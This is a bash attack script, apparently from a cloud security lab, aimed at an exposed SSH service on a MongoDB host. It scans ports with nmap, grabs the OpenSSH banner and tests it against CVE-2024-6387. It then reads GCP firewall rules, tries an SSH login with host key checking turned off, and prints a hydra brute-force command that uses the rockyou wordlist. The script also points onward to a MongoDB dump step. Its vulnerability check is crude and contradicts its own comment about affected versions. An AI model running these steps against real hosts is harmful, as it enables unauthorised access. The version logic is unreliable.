#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Attack 01 — SSH Command Execution
#
# MITRE ATT&CK : T1046 — Network Service Discovery
#                T1190 — Exploit Public-Facing Application
#                T1110 — Brute Force
#
# CVEs targeted : CVE-2024-6387 (regreSSHion) — OpenSSH unauthenticated RCE
#                 CVE-2023-38408 — ssh-agent remote code execution
set -euo pipefail

MONGO_IP="${1:-${MONGO_IP:?'Set MONGO_IP or pass as argument'}}"
SSH_PORT=22
REPORT_DIR="$(dirname "$0")/../attack-output"
mkdir -p "$REPORT_DIR"

banner() { echo; echo "  ┌─ $*"; }
step()   { echo "  │  $*"; }
done_()  { echo "  └─ done"; echo; }

# ── 1. Port scan ──────────────────────────────────────────────────────────────
banner "Phase 1: Port scan — confirming SSH is exposed to the internet"

nmap -sV -p 22,27017,80,443 "$MONGO_IP" \
  -oN "$REPORT_DIR/01-nmap.txt" \
  --open

step "Full nmap output saved → $REPORT_DIR/01-nmap.txt"
done_

# ── 2. Banner grab — extract OpenSSH version ──────────────────────────────────
banner "Phase 2: SSH banner grab — identifying OpenSSH version"

SSH_BANNER=$(ssh -o ConnectTimeout=5 \
                 -o StrictHostKeyChecking=no \
                 -o BatchMode=yes \
                 "$MONGO_IP" 2>&1 | head -5 || true)

step "Banner: $SSH_BANNER"

# Extract version number for CVE check
OPENSSH_VERSION=$(echo "$SSH_BANNER" | grep -oP 'OpenSSH_\K[\d.p]+' || echo "unknown")
step "OpenSSH version detected: $OPENSSH_VERSION"
done_

# ── 3. CVE-2024-6387 version check ───────────────────────────────────────────
banner "Phase 3: CVE-2024-6387 (regreSSHion) version check"

# Affected: OpenSSH < 4.4p1 (no patch), >= 8.5p1 to < 9.8p1
# This checks if the detected version falls in the vulnerable range
step "CVE-2024-6387 affects OpenSSH >= 8.5p1 and < 9.8p1 on glibc Linux"
step "Detected version: $OPENSSH_VERSION"

MAJOR=$(echo "$OPENSSH_VERSION" | cut -d. -f1)
MINOR=$(echo "$OPENSSH_VERSION" | cut -d. -f2 | tr -d 'p0-9' || echo "0")

if [[ "$MAJOR" -le 8 ]] || [[ "$MAJOR" -eq 9 && "${OPENSSH_VERSION}" < "9.8" ]]; then
  step "⚠️  Version appears vulnerable to CVE-2024-6387"
  step "   An unauthenticated attacker could achieve remote code execution"
  step "   CVSS Score: 8.1 (High)"
else
  step "Version may be patched — but SSH is still exposed to the internet"
fi
done_

# ── 4. Firewall confirmation via gcloud ───────────────────────────────────────
banner "Phase 4: Confirming GCP firewall allows 0.0.0.0/0 → port 22"

gcloud compute firewall-rules list \
  --filter="allowed[].ports:22" \
  --format="table(name,direction,sourceRanges,targetTags,allowed)" \
  2>/dev/null | tee "$REPORT_DIR/01-firewall-rules.txt"

step "Firewall rules saved → $REPORT_DIR/01-firewall-rules.txt"
done_

# ── 5. Direct SSH attempt ─────────────────────────────────────────────────────
banner "Phase 5: Attempting direct SSH connection"

step "Trying key-based auth with default lab key..."
if ssh -o ConnectTimeout=5 \
       -o StrictHostKeyChecking=no \
       -o BatchMode=yes \
       -i "${SSH_KEY_PATH:-~/.ssh/id_rsa}" \
       "${SSH_USER:-ubuntu}@$MONGO_IP" \
       "echo '[+] SSH access confirmed. Hostname: \$(hostname). User: \$(whoami)'" \
       2>/dev/null; then
  step "✓ SSH access successful — proceeding to Attack 02 (MongoDB dump)"
else
  step "Key auth failed — host is still reachable and exposed"
  step "In a real attack: hydra/medusa would brute-force credentials next"
  step "  hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://$MONGO_IP"
fi
done_

echo "  Attack 01 complete."
echo "  Finding: SSH port 22 is open to the internet on $MONGO_IP"
echo "  Next step: run attacks/02-mongodb-dump.sh"
